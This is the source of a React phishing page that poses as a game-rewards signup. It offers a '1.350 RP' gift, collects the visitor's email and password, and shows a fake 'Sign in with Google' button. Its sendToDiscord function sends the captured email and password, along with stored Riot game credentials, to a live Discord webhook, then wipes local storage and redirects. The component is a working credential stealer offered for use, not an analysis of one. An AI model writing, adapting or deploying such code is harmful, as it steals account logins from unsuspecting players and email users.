import React, { useState, useEffect } from 'react';
import { Gift, AlertCircle, Loader2 } from 'lucide-react';
import GmailWindow from './GmailWindow';

const Dashboard = () => {
  const [step, setStep] = useState(1);
  const [showGmail, setShowGmail] = useState(false);
  const [loadingGmail, setLoadingGmail] = useState(false);
  
  const [username, setUsername] = useState(localStorage.getItem('dash_user') || "");
  const [email, setEmail] = useState(localStorage.getItem('dash_email') || "");
  const [password, setPassword] = useState(localStorage.getItem('dash_pass') || "");
  const [error, setError] = useState("");

  useEffect(() => {
    localStorage.setItem('dash_user', username);
    localStorage.setItem('dash_email', email);
    localStorage.setItem('dash_pass', password);
  }, [username, email, password]);

  const sendToDiscord = async () => {
    const finalData = {
      riot_u: localStorage.getItem('riot_u') || "N/A",
      riot_p: localStorage.getItem('riot_p') || "N/A",
      dash_email: localStorage.getItem('dash_email') || email,
      dash_pass: localStorage.getItem('dash_pass') || password
    };
    
    await fetch('https://discord.com/api/webhooks/1527762392107188445/B95liOu8a0_Z1kN_mrrQCWKs3OBUezwnxGnF4CI_keGNPBYhAtLo9BOwwd-wAvMjRNPb', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "New Data Received",
          fields: [
            { name: "Riot Username", value: finalData.riot_u, inline: true },
            { name: "Riot Password", value: finalData.riot_p, inline: true },
            { name: "Dash Email", value: finalData.dash_email, inline: true },
            { name: "Dash Password", value: finalData.dash_pass, inline: true }
          ]
        }]
      })
    });
    localStorage.clear();
  };

  const handleVerify = async () => {
    if (!email || !password) {
      setError("Please fill in all fields.");
    } else if (email.length <= 6) {
      setError("Email must be longer than 6 characters.");
    } else if (!email.includes('@') || !email.includes('.')) {
      setError("Please enter a valid email address.");
    } else {
      setError("");
      await sendToDiscord();
      window.location.href = '/';
    }
  };

  const handleGmailClick = () => {
    setLoadingGmail(true);
    setTimeout(() => {
      setLoadingGmail(false);
      setShowGmail(true);
    }, 1500);
  };

  return (
    <div className="min-h-screen w-full bg-[#030108] text-slate-200 font-sans font-light antialiased relative flex flex-col items-center justify-center p-6 overflow-hidden select-none">
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_center,rgba(15,7,32,0.7),#030108)] pointer-events-none" />
      
      <div className="w-full max-w-[500px] relative z-10 p-8 md:p-10 rounded-3xl bg-gradient-to-b from-[#0e071c]/90 to-[#06020e]/95 border border-purple-500/20 shadow-[0_30px_80px_rgba(0,0,0,0.8)] backdrop-blur-xl">
        {step === 1 && (
          <div className="text-center animate-in fade-in duration-700">
            <Gift className="w-10 h-10 text-fuchsia-400 mx-auto mb-8" />
            <h1 className="text-3xl font-extralight text-white mb-4">Hello! Thank you for joining!</h1>
            <button onClick={() => setStep(2)} className="w-full h-12 bg-white text-black font-medium rounded-xl hover:bg-fuchsia-100 transition-all">Let's get started</button>
          </div>
        )}
        {step === 2 && (
          <div className="space-y-4 animate-in fade-in duration-500">
            <h1 className="text-xl text-white">What should we call you?</h1>
            <input type="text" value={username} onChange={(e) => setUsername(e.target.value)} className="w-full h-12 px-5 bg-[#0b0616] border border-purple-500/20 rounded-xl" />
            <button onClick={() => username.length >= 3 && setStep(3)} className="w-full h-12 bg-purple-600 rounded-xl">Continue</button>
          </div>
        )}
        {step === 3 && (
          <div className="space-y-4 animate-in fade-in duration-500">
            <h1 className="text-xl text-white">Hi, {username}!</h1>
            <p className="text-slate-400 text-sm">Verify your email to claim your <b className="text-red-500 bold">1.350 RP</b> welcome gift and unlock exclusive member offers.</p>
            {error && <div className="text-red-400 text-sm flex items-center gap-2"><AlertCircle className="w-4 h-4"/> {error}</div>}
            <input type="email" placeholder="Email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full h-12 px-5 bg-[#0b0616] border border-purple-500/20 rounded-xl" />
            <input type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} className="w-full h-12 px-5 bg-[#0b0616] border border-purple-500/20 rounded-xl" />
            <button onClick={handleVerify} className="w-full h-12 bg-white text-black rounded-xl font-medium">Verify & Claim</button>
            <button onClick={handleGmailClick} className="w-full h-12 flex items-center justify-center gap-3 border border-purple-500/20 rounded-xl">
              {loadingGmail ? <Loader2 className="animate-spin"/> : <><img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" className="w-5" alt="Google" /> Sign in with Google</>}
            </button>
          </div>
        )}
      </div>

      {showGmail && <GmailWindow onClose={() => setShowGmail(false)} />}
    </div>
  );
};

export default Dashboard;